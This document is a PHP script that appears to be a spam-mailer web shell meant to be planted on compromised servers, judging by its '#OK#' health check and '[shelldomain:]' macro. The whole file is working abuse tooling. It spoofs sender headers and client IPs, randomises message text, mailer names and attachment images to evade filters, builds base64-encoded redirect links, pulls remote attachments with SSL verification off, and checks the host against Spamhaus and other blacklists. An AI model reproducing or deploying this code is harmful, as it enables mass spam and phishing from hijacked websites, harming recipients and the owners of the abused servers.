<?php
/* 8h2KRe */
 @error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(150);
@ignore_user_abort(true);
@ini_set('max_execution_time', 150);
@ini_set('mail.add_x_header', 0);
@ini_set('expose_php', 0);

if (isset($_GET['check'])) exit('#OK#');

$_SERVER['PHP_SELF'] = '/index.php';

$ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(0, 255);

if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['HTTP_X_FORWARDED_FOR'] = $ip;
}

if (isset($_SERVER['REMOTE_ADDR'])) {
    foreach ($_SERVER as $key => $value) {
        if ($value == $_SERVER['REMOTE_ADDR']) {
            $_SERVER[$key] = $ip;
            break;
        }
    }
    $_SERVER['REMOTE_ADDR'] = $ip;
}

// Редирект
if (isset($_REQUEST['r'])) {
    $n_st = ''; $n_st1 = ''; $n_st2 = '?';
    foreach (explode('&', base64_decode($_REQUEST['r'])) as $param) {
        $d_st2 = explode('=', trim($param));
        if ($d_st2[0] == 'l') $n_st = $d_st2[1];
        else { $n_st1 .= $n_st2 . $d_st2[0] . '=' . $d_st2[1]; $n_st2 = '&'; }
    }
    echo "<meta http-equiv=\"refresh\" content=\"0;url=$n_st$n_st1\">";
    exit();
}

// Отписаться от рассылки
if (isset($_REQUEST['u'])) {
    $d_st = base64_decode($_REQUEST['u']);
    file_put_contents('logsubsc.log', date('[Y-m-d H:i:s] ') . $d_st . "\r\n", FILE_APPEND | LOCK_EX);
    echo "<br><br><br><center>You have unsubscribed from the newsletter!!!</center><br><center>Email: <b>$d_st</b></center>";
    exit();
}

// Вывести лог отписок от рассылки
if (isset($_REQUEST['lu'])) {
    echo nl2br(file_get_contents('logsubsc.log'));
    exit();
}

// Удалить лог отписок от рассылки
if (isset($_REQUEST['du'])) {
    unlink('logsubsc.log');
    exit();
}

if (isset($_REQUEST['ce'])) parse_str(base64_decode($_REQUEST['ce']), $_REQUEST);

$encoding = isset($_REQUEST['e']) ? $_REQUEST['e'] : 'UTF-8';
$custom_headers = isset($_REQUEST['che']) ? $_REQUEST['che'] : false;

if (isset($_REQUEST['ch'])) { check(); exit; }
if (isset($_REQUEST['sn'])) { send(); exit; }

function send() {
    $domain = str_replace('www.', '', $_SERVER['HTTP_HOST']);
    $_REQUEST['m'] = str_replace('[shelldomain:]', ucfirst(explode('.', $domain)[0]), $_REQUEST['m']);

    foreach (explode("\n", $_REQUEST['em']) as $email) {
        $data = explode('|', trim($email));
        $r_replyto = macrosRandom($_REQUEST['rpt'], $data);
        $r_from_ = macrosRandom(dataHandler($_REQUEST['f']), $data);
        $r_from = explode(':', $r_from_);

        $r_subject = dataHandler($_REQUEST['s']);
        $r_message = $_REQUEST['m'];

        $r_subject = macrosRandom(str_replace(['[from:]', '[email:]'], [$r_from[0], $data[0]], $r_subject), $data);
        $r_message = macrosRandom(str_replace(['[from:]', '[email:]'], [$r_from[0], $data[0]], $r_message), $data);

        if (!sMail($data[0], $r_from[1], $r_message, $r_subject, $r_replyto, $r_from[0])) {
            echo '*send:bad*';
            exit;
        }
    }
    echo '*send:ok*';
    exit();
}

function sMail($to, $from, $message, $subject, $replyto, $from_name) {
    global $unsubscribe, $attachement_array, $encoding;
	
	$has_attachment = isset($_FILES['attachment']) && $_FILES['attachment']['error'] == UPLOAD_ERR_OK;
	
    if (isset($_FILES['file']) && is_file($_FILES['file']['tmp_name'])) {
        $fileString = fileString($_FILES['file']['name']);
        $filename = $_REQUEST['fn'];
		$has_attachment = true;
    }
	
	if (isset($attachment_array) && is_array($attachment_array) && count($attachment_array) > 0)
		$has_attachment = true;
	
	if ($has_attachment) {
		$content_type = 'multipart/mixed';
	} else {
		$content_type = 'multipart/alternative';
	}

    $from_name = trim($from_name) ?: randText();
    $from = trim($from) ?: str_replace(' ', '', $from_name) . '@' . $_SERVER['HTTP_HOST'];
    $replyto = trim($replyto) ?: $from;
    $type = $_REQUEST['tp'] == '1' ? 'text/html' : 'text/plain';
	
	$boundary_mixed = md5(time());
	$boundary_alternative = md5(time() + 1);

    $headers = getHeaders($from_name, $from, $replyto);
	if ($unsubscribe) $headers .= 'List-Unsubscribe: <mailto:' . $from . ">\r\n";

	if (!$has_attachment) {
		$headers .= "Content-Type: $content_type; boundary=\"$boundary_alternative\"\r\n";
		
		$body = "--$boundary_alternative\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n";
		$body .= chunk_split(base64_encode(cut_tags($message)));

		if ($type == 'text/html') {
			$body .= "\r\n\r\n--$boundary_alternative\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n";
			$body .= chunk_split(base64_encode($message));
		}

		$body .= "\r\n\r\n--$boundary_alternative--";
	} else {
		$headers .= "Content-Type: $content_type; boundary=\"$boundary_mixed\"\r\n";
		
		$body = "--$boundary_mixed\r\n";
		$body .= "Content-Type: multipart/alternative; boundary=\"$boundary_alternative\"\r\n\r\n";

		$body .= "--$boundary_alternative\r\n";
		$body .= "Content-Type: text/plain; charset=UTF-8\r\n";
		$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
		$body .= chunk_split(base64_encode(cut_tags($message)));

		if ($type == 'text/html') {
			$body .= "--$boundary_alternative\r\n";
			$body .= "Content-Type: text/html; charset=UTF-8\r\n";
			$body .= "Content-Transfer-Encoding: base64\r\n\r\n";
			$body .= chunk_split(base64_encode($message));
		}

		$body .= "--$boundary_alternative--\r\n";

		if (isset($fileString)) {
			$body .= "\r\n\r\n--$boundary_mixed\r\nContent-Type: {$_FILES['file']['type']}; name=\"$filename\"\r\n";
			$body .= "Content-Disposition: attachment; filename=\"$filename\"\r\nContent-Transfer-Encoding: base64\r\nX-Attachment-Id: " . rand(1000, 99999) . "\r\n\r\n";
			$body .= chunk_split(base64_encode($fileString));
		}

		foreach ($attachement_array as $attachment) {
			$attachment[1] = trim($attachment[1]);
			file_put_contents($attachment[1], downloadSource($attachment[0]));

			if (file_exists($attachment[1])) {
				$fileData = file_get_contents($attachment[1]);
				$body .= "\r\n\r\n--$boundary_mixed\r\nContent-Type: " . mime_content_type($attachment[1]) . "; name=\"{$attachment[1]}\"\r\n";
				$body .= "Content-Disposition: attachment; filename=\"{$attachment[1]}\"\r\nContent-Transfer-Encoding: base64\r\nX-Attachment-Id: " . rand(1000, 99999) . "\r\n\r\n";
				$body .= chunk_split(base64_encode($fileData));
				unlink($attachment[1]);
			}
		}

		$body .= "\r\n\r\n--$boundary_mixed--";
	}

    $subject = "=?$encoding?B?" . base64_encode(iconv('UTF-8', $encoding, $subject)) . "?=";

    return mail($to, $subject, $body, $headers);
}

function dataHandler($data) {
    $ex = explode("\n", $data);
    return trim($ex[array_rand($ex)]);
}

function macrosRandom($text, $data) {
    global $randm_array, $attachement_array, $unsubscribe;

    preg_match_all('#\[num:(.+?)\]#is', $text, $result2);
    preg_match_all('#\[randM:(.+?)\]#is', $text, $result3);
    preg_match_all('#\[randstr:(.+?)\]#is', $text, $result4);
    preg_match_all('#\[var:(.+?)\]#is', $text, $result5);
    preg_match_all('#\{rand:(.+?)\}#is', $text, $result6);
    preg_match_all('#\[redirect:(.+?)\]#is', $text, $result7);
    preg_match_all('#\{randM:(.+?)\}#is', $text, $result8);

    foreach ($result7[1] as $index => $link) {
        $link_parts = explode('>>>', $link);
        $current_url = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
        $redirect_url = "l=" . (strpos($link_parts[0], '{rand:') !== false ? $link_parts[array_rand(explode('|', $link_parts[0]))] : $link_parts[0]);

        for ($i = 1; $i < count($link_parts); $i++) {
            if (strpos($link_parts[$i], 'email:') !== false) {
                $redirect_url .= "&e=" . trim($data[0]);
            } elseif (strpos($link_parts[$i], 'var:') !== false) {
                $var_index = explode(':', $link_parts[$i])[1];
                $redirect_url .= "&v$var_index=" . trim($data[$var_index]);
            } elseif (strpos($link_parts[$i], 'link:') !== false) {
                $current_url = explode(':', $link_parts[$i], 2)[1];
            } else {
                $redirect_url .= "&" . $link_parts[$i];
            }
        }

        $text = str_replace_once($result7[0][$index], "$current_url?r=" . base64_encode($redirect_url), $text);
    }

    if (strpos($text, '[unsubscribe:]') !== false) {
        $unsubscribe_url = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}?u=" . base64_encode($data[0]);
        $unsubscribe = 1;
        $text = str_replace('[unsubscribe:]', $unsubscribe_url, $text);
    }

    foreach ($result6[1] as $index => $rand) {
        $rand_options = explode('|', $rand);
        $text = str_replace_once($result6[0][$index], $rand_options[array_rand($rand_options)], $text);
    }

    foreach ($result2[1] as $index => $num) {
        list($min, $max) = explode('|', $num);
        if (is_numeric($min) && is_numeric($max)) {
            $text = str_replace_once($result2[0][$index], rand($min, $max), $text);
        }
    }

    foreach ($result8[1] as $index => $rand) {
        $rand_options = explode('|', $rand);
        $matched_rand = false;

        foreach ($randm_array as $randm) {
            if ($randm[0] == $result8[0][$index]) {
                $text = str_replace($result8[0][$index], $randm[1], $text);
                $matched_rand = true;
                break;
            }
        }

        if (!$matched_rand) {
            $selected_rand = $rand_options[array_rand($rand_options)];
            $randm_array[] = [$result8[0][$index], $selected_rand];
            $text = str_replace($result8[0][$index], $selected_rand, $text);
        }
    }

    foreach ($result3[1] as $index => $rand) {
        $rand_options = explode('|', $rand);
        $matched_rand = false;

        foreach ($randm_array as $randm) {
            if ($randm[0] == $result3[0][$index]) {
                $text = str_replace($result3[0][$index], $randm[1], $text);
                $matched_rand = true;
                break;
            }
        }

        if (!$matched_rand) {
            $selected_rand = $rand_options[array_rand($rand_options)];
            $randm_array[] = [$result3[0][$index], $selected_rand];
            $text = str_replace($result3[0][$index], $selected_rand, $text);
        }
    }

    foreach ($result4[1] as $index => $rand) {
        list($min, $max) = explode('|', $rand);
        if (is_numeric($min) && is_numeric($max)) {
            $text = str_replace_once($result4[0][$index], randString($min, $max), $text);
        }
    }

    foreach ($result5[1] as $index => $var) {
        if (is_numeric($var)) {
            $text = str_replace($result5[0][$index], $data[$var], $text);
        }
    }

    preg_match_all('#\[rand:(.+?)\]#is', $text, $result);
    foreach ($result[1] as $index => $rand) {
        $rand_options = explode('|', $rand);
        $text = str_replace_once($result[0][$index], $rand_options[array_rand($rand_options)], $text);
    }

    $text = str_replace(['[spoof:', ']'], ':', $text);
    $text = str_replace(['{var:}', '{email:}'], ['{var:1}', trim($data[0])], $text);

    preg_match_all('#\[base64:(.+?)\]#is', $text, $result12);
    foreach ($result12[1] as $index => $base64_text) {
        preg_match_all('#\{var:(.+?)\}#is', $base64_text, $result12_var);
        foreach ($result12_var[1] as $var_index => $var) {
            if (is_numeric($var)) {
                $base64_text = str_replace_once($result12_var[0][$var_index], $data[$var], $base64_text);
            }
        }

        $text = str_replace_once($result12[0][$index], base64_encode($base64_text), $text);
    }

    preg_match_all('#\[attachment:(.+?)\]#is', $text, $result9);
    foreach ($result9[1] as $index => $attachment) {
        $attachement_array[] = explode('>>>', $attachment);
        $text = str_replace_once($result9[0][$index], '', $text);
    }

    preg_match_all('#\[attachmentM:(.+?)\]#is', $text, $result10);
    foreach ($result10[1] as $index => $attachment) {
        $attachment_options = explode('>>>', $attachment);
        preg_match_all('#\((.+?)\)#is', $attachment_options[0], $result11);

        foreach ($result11[1] as $range) {
            list($min, $max) = explode(',', $range);
            $random_value = rand(intval($min), intval($max) - 1);
            $attachment_options[0] = str_replace_once($range, $random_value, $attachment_options[0]);
            $attachment_options[0] = str_replace(['(', ')'], '', $attachment_options[0]);
        }

        $attachement_array[] = $attachment_options;
        $text = str_replace_once($result10[0][$index], '', $text);
    }

    preg_match_all('#\[image64:(.+?)\]#is', $text, $result13);
    $image64_file = 'image64_file.png';
    foreach ($result13[1] as $index => $image_url) {
        file_put_contents($image64_file, file_get_contents($image_url));
        $image_data = file_get_contents($image64_file);
        $mime_type = mime_content_type($image64_file);
        $base64_image = 'data:' . $mime_type . ';base64,' . base64_encode($image_data);
        $text = str_replace_once($result13[0][$index], $base64_image, $text);
        unlink($image64_file);
    }

    return $text;
}

function getHeaders($fromname, $frommail, $replyto = null) {
    global $encoding, $custom_headers;
    $replyto = $replyto ?: $frommail;
    $headers = "From: =?$encoding?B?" . base64_encode(iconv('UTF-8', $encoding, $fromname)) . "?= <" . $frommail . ">\r\n";
    $headers .= "Reply-To: " . $replyto . "\r\n";
    $headers .= "X-Mailer: " . strtoupper(randText()) . "\r\nMIME-Version: 1.0\r\n";
    if (isset($custom_headers) && !empty($custom_headers)) {
        $headers .= str_replace("\n", "\r\n", trim($custom_headers)) . "\r\n";
    }
    return $headers;
}

function check() {
    $crlf = "\r\n";
    if (isset($_REQUEST['st'])) echo '*valid:ok*' . $crlf;
    if (isset($_REQUEST['m']) && function_exists('mail')) {
        $email = explode(':', $_REQUEST['m'])[0];
        echo checkMail($email) ? '*mail:ok*' . $crlf : '*mail:bad*' . $crlf;
    } else echo '*mail:bad*' . $crlf;
    if (isset($_REQUEST['rb'])) echo ($rbl = checkRBL()) == '' ? '*rbl:ok*' : '*rbl:' . $rbl . '*';
}

function randString($min, $max) {
    $chars = 'qwertyuiopasdfghjklzxcvbnm';
    return substr(str_shuffle(str_repeat($chars, rand($min, $max))), 0, rand($min, $max));
}

function checkRBL() {
    $dnsbl_check = [
        'b.barracudacentral.org',
        'xbl.spamhaus.org',
        'sbl.spamhaus.org',
        'zen.spamhaus.org',
        'bl.spamcop.net'
    ];
    $ip = gethostbyname($_SERVER['HTTP_HOST']);
    if (!$ip) return '*rbl:unknown*';

    $rip = implode('.', array_reverse(explode('.', $ip)));
    $result = '';

    foreach ($dnsbl_check as $dnsbl) {
        if (checkdnsrr("$rip.$dnsbl.", 'A')) $result .= "$dnsbl, ";
    }

    return rtrim($result, ', ');
}

function checkMail($to) {
    $headers = getHeaders(randText(), randText() . '@' . $_SERVER['HTTP_HOST']);
    $headers .= "Content-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n";
    return mail($to, $_SERVER['HTTP_HOST'], chunk_split(base64_encode(getMessageText())), $headers);
}

function cut_tags($message)
{
    $message1    = trim(strip_tags($message, '<a>'));
    $find_a      = True;
    $message1_   = array();
    $find_a_i    = array();
    $find_a_i[0] = 0;
    while ($find_a == True) {
        $find_a_i[0] = strpos($message1, '<a', $find_a_i[0]);
        if ($find_a_i[0] != False) {
            $find_a_i[1]  = strpos($message1, 'href', $find_a_i[0] + 1);
            $find_a_i[1]  = strpos($message1, '"', $find_a_i[1] + 1);
            $find_a_i[2]  = strpos($message1, '"', $find_a_i[1] + 1);
            $find_a_i[3]  = strpos($message1, '</', $find_a_i[2] + 1);
            $find_a_i[3]  = strpos($message1, '>', $find_a_i[3] + 1);
            $find_a_i[4]  = strlen($message1) - 1;
            $message1_[0] = substr($message1, 0, $find_a_i[0]);
            $message1_[1] = substr($message1, $find_a_i[1] + 1, $find_a_i[2] - $find_a_i[1] - 1);
            $message1_[2] = substr($message1, $find_a_i[3] + 1, $find_a_i[4] - $find_a_i[3] + 1);
            $message1     = $message1_[0] . $message1_[1] . $message1_[2];
        } else {
            $find_a = False;
        }
    }
    return $message1;
}

function str_replace_once($search, $replace, $text) {
    $pos = strpos($text, $search);
    return $pos !== false ? substr_replace($text, $replace, $pos, strlen($search)) : $text;
}

function getFilename($name) {
    $format = pathinfo($name, PATHINFO_EXTENSION);
    $prefixes = ['SDC', 'P', 'DC', 'CAM', 'IMG-'];
    $images = ['png', 'jpg', 'gif', 'jpeg', 'bmp'];
    return in_array(strtolower($format), $images) ? $prefixes[array_rand($prefixes)] . rand(10, 999999) . ".$format" : randText() . ".$format";
}

function downloadSource($url) {
    return file_get_contents($url, false, stream_context_create([
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ])) ?: false;
}

function fileString($name) {
    return in_array(strtolower(pathinfo($name, PATHINFO_EXTENSION)), ['jpeg', 'jpg']) && checkRandIMG() ? randIMG($_FILES['file']['tmp_name']) : file_get_contents($_FILES['file']['tmp_name']);
}

function randText() {
    return substr(str_shuffle(str_repeat('qwertyuiopasdfghjklzxcvbnm', rand(3, 8))), 0, rand(3, 8));
}

function getMessageText() {
    $chars = 'qwertyuiopasdfghjklzxcvbnm';
    $message = '';
    for ($i = 0; $i < rand(9, 20); $i++) {
        $message .= substr(str_shuffle(str_repeat($chars, rand(6, 10))), 0, rand(6, 10));
        $message .= str_repeat([' ', ' ', ' ', ' ', ' ', ', ', '? ', '. ', '! '][rand(0, 8)], 1);
    }

    $message = trim($message);
    if (strlen($message) > 0) {
        $message[0] = strtoupper($message[0]);
    }

    $len = strlen($message);
    for ($i = 1; $i < $len; $i++) {
        if (in_array($message[$i-1], array('.', '?', '!')) && $i < $len - 1 && $message[$i] == ' ') {
            $message[$i+1] = strtoupper($message[$i+1]);
        }
    }

    return $message;
}

function checkRandIMG() {
    foreach (['getimagesize', 'imagecreatetruecolor', 'imagecreatefromjpeg', 'imagecopyresampled', 'imagefilter', 'ob_start', 'imagejpeg', 'ob_get_clean'] as $func) {
        if (!function_exists($func)) return false;
    }
    return true;
}

function randIMG($file) {
    list($width, $height) = getimagesize($file);
    $new_width = rand(1, 2) == 1 ? $width + rand(-10, 10) : $width;
    $new_height = rand(1, 2) == 1 ? $height + rand(-10, 10) : $height;
    $quality = rand(1, 2) == 1 ? 75 : rand(65, 105);
    $brightness = rand(1, 2) == 1 ? rand(0, 35) : 0;
    $contrast = rand(1, 2) == 1 ? rand(-15, 15) : 0;

    $image_p = imagecreatetruecolor($new_width, $new_height);
    $image = imagecreatefromjpeg($file);
    imagecopyresampled($image_p, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
    imagefilter($image_p, IMG_FILTER_CONTRAST, $contrast);
    imagefilter($image_p, IMG_FILTER_BRIGHTNESS, $brightness);
    ob_start();
    imagejpeg($image_p, null, $quality);
    $out = ob_get_clean();
    imagedestroy($image_p);

    return $out;
}
